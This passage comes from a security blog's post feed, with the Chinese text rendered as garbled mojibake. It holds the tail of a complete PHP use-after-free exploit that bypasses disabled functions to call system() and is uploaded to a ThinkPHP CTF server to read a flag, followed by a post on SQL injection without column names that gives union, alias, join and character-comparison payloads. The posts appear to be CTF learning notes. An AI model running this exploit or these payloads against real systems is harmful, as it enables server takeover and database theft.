class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å°†å…¶ä¸Šä¼ åˆ°**&#x2F;var&#x2F;www&#x2F;html&#x2F;runtime&#x2F;session&#x2F;<strong>ä¸‹ï¼Œå³æˆ‘è¿™é‡Œçš„</strong>1.php**æ–‡ä»¶</p><p><img src="https://img-blog.csdnimg.cn/43402dfcef7141649193bbf7e3b01e14.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹ååœ¨è®¿é—®1.phpæ–‡ä»¶å³å¯è·å¾—flag</p><p><img src="https://img-blog.csdnimg.cn/0c50b621d95340479b2aee86be84f51c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> ååºåˆ—åŒ– </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thinkphp </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“</title>
      <link href="/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2021/12/12/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“"><a href="#æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“" class="headerlink" title="æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“"></a>æ— åˆ—åæ³¨å…¥å§¿åŠ¿æ€»ç»“</h1><h2 id="æ„Ÿå—"><a href="#æ„Ÿå—" class="headerlink" title="æ„Ÿå—"></a>æ„Ÿå—</h2><p>ä»å­¦ä¹ å®‰å…¨ä»¥æ¥ï¼Œè¿˜æœªè‡ªå·±æ€»ç»“è¿‡ï¼Œå¾€å¾€ä¸€æ—¶ä¼šäº†å°±ä¸å†ç†ä¼šï¼Œé‡åˆ°ç›¸ä¼¼çš„é¢˜çš„æ—¶å€™åˆå†¥æ€è‹¦æƒ³æ‰èƒ½å›æƒ³èµ·æ¥ï¼Œæ‰€ä»¥å†³å®šä»ä»Šå¤©å¼€å§‹ï¼Œè§„å¾‹çš„å¯¹ä¸€äº›æ–¹æ³•è¿›è¡Œæ€»ç»“ã€‚</p><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>åœ¨<strong>mysql</strong>æ•°æ®åº“ä¸­ï¼Œ<strong>information_schema</strong>æ•°æ®åº“ä¿å­˜ç€mysqlæ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰ï¼Œè€Œé¢˜ç›®åˆ™ä¼šæœ‰æ„çš„è¿‡æ»¤æ‰è¿™ä¸ªåº“ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¾—åˆ©ç”¨å…¶ä»–æ‰‹æ®µæ¥ç»•è¿‡ã€‚</p><h3 id="çˆ†åº“åå’Œè¡¨å"><a href="#çˆ†åº“åå’Œè¡¨å" class="headerlink" title="çˆ†åº“åå’Œè¡¨å"></a>çˆ†åº“åå’Œè¡¨å</h3><p><strong>å…¶ä»–åº“æˆ–è€…è§†å›¾ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysqlï¼š</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sysï¼š</span><br><span class="line">x$schema_table_statistics_with_buffer</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">è§†å›¾ï¼š</span><br><span class="line">schema_auto_increment_columns</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from |mysql.innodb_table_stats|x$schema_table_statistics_with_buffer|schema_auto_increment_columns|.....|</span><br></pre></td></tr></table></figure><h3 id="å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®"><a href="#å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®" class="headerlink" title="å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®"></a><strong>å–åˆ«åç»•è¿‡åˆ—åæŸ¥æ•°æ®</strong></h3><p><strong>åŸºæœ¬æŸ¥è¯¢ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_user;</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| username | password | id   | status |</span><br><span class="line">+----------+----------+------+--------+</span><br><span class="line">| Tom      | 123      | 1    | 1      |</span><br><span class="line">| Bob      | 1234     | 2    | 2      |</span><br><span class="line">| Dam      | 12345    | 3    | 3      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| Tony     | a        | 4    | 4      |</span><br><span class="line">| xi       | 123      | NULL | NULL   |</span><br><span class="line">+----------+----------+------+--------+</span><br></pre></td></tr></table></figure><p><strong>å°†åˆ—åè½¬æ¢ä¸ºä»»ä½•å¯é€‰çš„å·²çŸ¥å€¼ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3,4 union select * from tp_user;</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">+------+-------+------+------+</span><br><span class="line">| 1    | 2     | 3    | 4    |</span><br><span class="line">| Tom  | 123   | 1    | 1    |</span><br><span class="line">| Bob  | 1234  | 2    | 2    |</span><br><span class="line">| Dam  | 12345 | 3    | 3    |</span><br><span class="line">| Tony | a     | 4    | 4    |</span><br><span class="line">| xi   | 123   | NULL | NULL |</span><br><span class="line">+------+-------+------+------+</span><br></pre></td></tr></table></figure><p><strong>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨1ï¼Œ2ï¼Œ3ï¼Œ4æ¥ä»£æ›¿åˆ—åäº†ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `1` from (select 1,2,3,4 union select * from tp_user) as a;</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| Tom  |</span><br><span class="line">| Bob  |</span><br><span class="line">| Dam  |</span><br><span class="line">| Tony |</span><br><span class="line">| xi   |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(a) from(select 1 as a,2 as b,3 as c,4 as d union select * from tp_user)as m),3&#x27;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨joinçˆ†åˆ—å"><a href="#åˆ©ç”¨joinçˆ†åˆ—å" class="headerlink" title="åˆ©ç”¨joinçˆ†åˆ—å"></a>åˆ©ç”¨joinçˆ†åˆ—å</h3><p>éœ€è¦æœ‰å›æ˜¾æ‰èƒ½ä½¿ç”¨</p><p>ç”±äºjoinæ˜¯å°†ä¸¤å¼ è¡¨çš„åˆ—åç»™åŠ èµ·æ¥ï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šäº§ç”Ÿç›¸åŒçš„åˆ—åï¼Œè€Œåœ¨ä½¿ç”¨åˆ«åæ—¶ï¼Œæ˜¯ä¸å…å‡ºç°ç›¸åŒçš„åˆ—åçš„ï¼Œå› æ­¤å½“å®ƒä»¬ä¸¤ä¸ªä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå°±ä¼šçˆ†å‡ºç›¸åŒçš„åˆ—åçš„åç§°ï¼Œä»è€Œè·å¾—åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_one;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Tom      | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b using(username)) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p><strong>payloadï¼š</strong></p><p>è·å–ç¬¬ä¸€ä¸ªåˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select * from (select * from users as a join users as b)as c#</span><br></pre></td></tr></table></figure><p>è·å–ä¸‹ä¸€ä¸ªåˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select*from (select * from users as a join users as b using(username))as c#</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢"><a href="#å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢" class="headerlink" title="å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢"></a>å­—ç¬¦æ¯”è¾ƒæŸ¥è¯¢</h3><p>è¦çŸ¥é“æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ä¸å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œä¸ç­‰å¼æˆç«‹è¿”å›1ï¼Œä¸ç­‰å¼ä¸æˆç«‹è¿”å›0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x27;g&#x27;æ˜¯æ¯”&#x27;f&#x27;å¤§çš„ï¼Œæ‰€ä»¥è¿”å›1</span><br><span class="line">mysql&gt; select (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              1 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">å½“ç›¸ç­‰æˆ–è€…å°äºæ—¶ï¼Œå°±ä¼šè¿”å›0</span><br><span class="line">mysql&gt; select (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°±å¯ä»¥é€å­—ç¬¦çˆ†ç ´æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               1 |</span><br><span class="line">+---------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span 